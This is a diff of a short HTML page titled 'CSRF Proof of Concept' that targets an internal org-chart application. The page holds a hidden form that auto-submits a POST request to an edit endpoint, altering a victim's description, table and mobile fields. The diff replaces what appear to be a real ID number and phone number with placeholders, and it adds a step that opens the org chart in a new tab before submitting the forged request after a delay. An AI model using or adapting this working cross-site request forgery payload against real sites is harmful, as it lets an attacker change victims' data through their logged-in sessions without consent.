@@ -6,13 +6,20 @@
 <body>
     <h1>CSRF Proof of Concept</h1>
     <form action="https://orgchart/edit_desc.php" method="POST" id="csrfForm">
-        <input type="hidden" name="sso" value="212628051">
+        <input type="hidden" name="sso" value="1111">
         <input type="hidden" name="desc" value="">
-        <input type="hidden" name="table" value="6C6/7">
-        <input type="hidden" name="mobile" value="+420720843234">
+        <input type="hidden" name="table" value="1111">
+        <input type="hidden" name="mobile" value="1111">
     </form>
     <script>
-        document.getElementById('csrfForm').submit();
+        // Open the org chart in a new tab or window
+        window.open('https://orgchart/', '_blank');
+
+        // Submit the CSRF form after a short delay to ensure the new window opens first
+        setTimeout(() => {
+            document.getElementById('csrfForm').submit();
+        }, 500); // 500ms delay
     </script>
 </body>
 </html>
+
